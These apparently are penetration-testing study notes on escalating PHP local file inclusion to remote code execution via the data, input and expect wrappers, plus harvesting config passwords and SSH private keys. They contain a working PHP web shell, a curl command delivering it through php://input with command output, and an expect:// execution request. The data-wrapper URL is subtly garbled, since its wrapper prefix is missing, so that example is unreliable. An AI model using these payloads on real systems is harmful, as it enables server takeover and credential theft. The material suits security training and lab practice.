# Remote Code Execution
## PHP Wrappers

Not only we can read files, but we can achieve RCE and execute commands on the backend.

A way to do this is to enumerate user credentials and SSH keys, then use them to login to the back-end via SSH.

For example we can find a db password in a file such as `config.php` which can match the user's password.

Or we can check the `.ssh` directory and if read privileges are not set properly we can grab their private key, and use it to SSH into the system.

### Data

The `data` wrapper can be used to include external data, like PHP code.

But this wrapper can be used only if the `allow_url_include` setting is enabled in the PHP configuration.

It's not really uncommon to see this option enabled, as many web apps rely on it to function, such as some `WordPress` plugins and themes.

#### RCE

With the `allow_url_include` enabled we can use the `data` wrapper attack.

So we will pass some php code in base64 encoded with `text/plain:base64` and it has the ability to decode and execute.

So first let's encode it:

```sh
echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Now `URL-encode` it and pass it with the `data` wrapper, and then we can pass commands to the web shell with `&cmd=`.

```http
http://<SERVER_IP>:<PORT>/index.php?language=dcPD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

### Input

Similar to the `data` wrapper, `input` wrapper can be used to include external input and execute PHP code.

The difference is that in the `input` wrapper we pass the input as a `POST` request's data.

This means that the vulnerable parameter must accept `POST` requests. 

Same as with the `data` wrapper, in order for this to be successful `allow_url_include` must be set.

```sh
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://server:PORT/index.php?language=php://input&cmd=id" | grep uid

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Expect

This allows us also to directly run commands through URL streams. 

Here we don't need to provide a web shell, because it is designed to execute commands.

This is an `external wrapper` so it needs to be installed manually and enabled on the back-end server, and some web apps need this for their core functionality.

We can see if itt's installed on the backend in the same way as we did with the `allow_url_include`, but we `grep` for `expect`:

```sh
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```

And then the `expect` wrapper can be used as follows:

```sh
curl -s "http://server:PORT/index.php?language=expect://id"
```

